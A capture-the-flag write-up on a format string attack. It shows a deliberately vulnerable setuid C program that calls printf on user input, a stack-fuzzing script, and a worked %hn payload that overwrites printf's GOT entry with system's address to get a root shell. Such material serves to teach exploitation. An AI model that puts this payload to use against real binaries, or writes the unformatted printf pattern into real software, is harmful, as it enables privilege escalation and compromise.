```c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[300];
    
    while(1) {
        fgets(buffer, sizeof(buffer), stdin);
        printf(buffer);
    }
}

int main() {
    setuid(0);
    setgid(0);

    vuln();

    return 0;
}
```

```txt
flag{50_7h475_h0w_w3_0v3rwr173_7h3_G0T}
```

```bash
gcc prog.c -o prog -no-pie -m32
```

> Note: We can do this with 64-bit executables too.

This challenge has PIE disabled so we can focus on the GOT. The executable has RELRO set to partial. If we have full RELRO then we can't overwrite the GOT entries.

In the challenge, we have an infinite loop that will call `fgets`, which is safe, and `printf` without a format specifier, which means we can perform a format string attack on this. The idea is that we want to overwrite one of the function's address in the GOT with the address of a function we want to execute.

Because the program is using an infinite loop, what we could do is try replacing the address of the `printf` function with a function that we want to call. On the first iteration of the loop, the payload will be executed by the `printf` function, then the next iteration of the loop will execute the function that `printf` replaced itself with. We'll replace it with the `system` function.

For more explanation on `got` and `plt`, check [this](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html). But basically, Those starting with `.plt` contain stubs to jump to the target, those starting with `.got` are tables of the target addresses.

We'll fuzz the program and check out the first 100 hex items on the stack:

```python
for i in range(100):
    try:
        # Format the counter
        p.sendline('%{}$x'.format(i).encode())
        
        # Receive the response
        result = p.recvline().decode()
        
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```

We'll need to use `%n`, which will allow us to write the size of our input into the address pointed by `%n`. We can specify the address to write to on the stack by using `%<num>$n`.

So we can figure out where in the stack our input will be placed in by doing something like `AAAA%7$p` but we change the number 7 with some other numbers as well. If we see the output with `0x41414141`, then we know that that's where our input will land in the stack. In this case, our input landed on the 4th position on the stack, so `AAAA%4$p` printed out `0x41414141`.

So we can write an address into this position and when `printf` comes by to print our input out, it will access this address.

If we're trying to write a big value into the specified address, we'll need to break it up using `%hn`. For example, if we want to write `0xcafebabe` to `0xbffff6ae`. `0xcafe` (51966 in decimal) will be written in the high order bytes and `0xbabe` (47806 in decimal) in the low order bytes. We want to write those value at `0xbffff6ac`. It means writing `0xcafe` at `0xbffff6ac + 2` = `0xbffff6ae` (high order) and `0xbabe` at `0xbffff6ac` (low order).

```
\xac\xf6\xff\xbf\xae\xf6\xff\xbf%47798x%7$hn%4160x%8$hn
```

Where:
- `\xac\xf6\xff\xbf` (`0xbffff6ac`) points to the low order bytes.
- `\xae\xf6\xff\xbf` (`0xbffff6ae`) points to the high order bytes.
- `%47798x` will write 47798 bytes to the standard output since we already wrote 8 bytes to the stack.
- `%7$hn` will write 8 + 47798 = 47806 (`0xbabe`) at the first address specified (`0xbffff6ac`).
- `%4160x` will write 4160 bytes to the standard output.
- `%8$hn` will write `8 + 47798 + 4160 = 51966` (`0xcafe`) at the second address specified (`0xbffff6ae`).

For our challenge, we need to write the `system` function's address found in `libc` (`0xf7dff040`) to `printf` address on the GOT, which is `0x0804c00c`. So we write `0xf7df` (63455) to the high bytes, which is `0x0804c00c + 2 = 0x0804c00e`, and write `0xf040` (61504) to `0x0804c00c`.

The payload will be this:

```
\x0c\xc0\x04\x08\x0e\xc0\x04\x08%61496x%4$hn%1951x%5$hn
```

Where:
- `\x0c\xc0\x04\x08` (`0x0804c00c`) points to the low order bytes.
- `\x0e\xc0\x04\x08` (`0x0804c00e`) points to the high order bytes.
- `%61496x` will write 61496 bytes to the standard output since we already wrote 8 bytes to the stack.
- `%4$hn` will write 8 + 61496 = 61504 (`0xf040`) at the first address specified (`0x0804c00c`).
- `%1951x` will write 1951 bytes to the standard output.
- `%5$hn` will write `8 + 61496 + 1951 = 63455` (`0xf7df`) at the second address specified (`0x0804c00e`).

We can send that to the program with python:

```python
python -c 'import sys; sys.stdout.buffer.write(b"\x0c\xc0\x04\x08\x0e\xc0\x04\x08%61496x%4$hn%1951x%5$hn")' > payload
```

Because this is an interactive shell, we'll export the payload into a file then do this bash command:

```bash
(cat payload ; cat) | ./prog
```

So now our input won't be passed into the `printf` function anymore, it will be passed into the `system` function. Now we basically got an interactive root shell.

[Format strings reference](https://axcheron.github.io/exploit-101-format-strings/)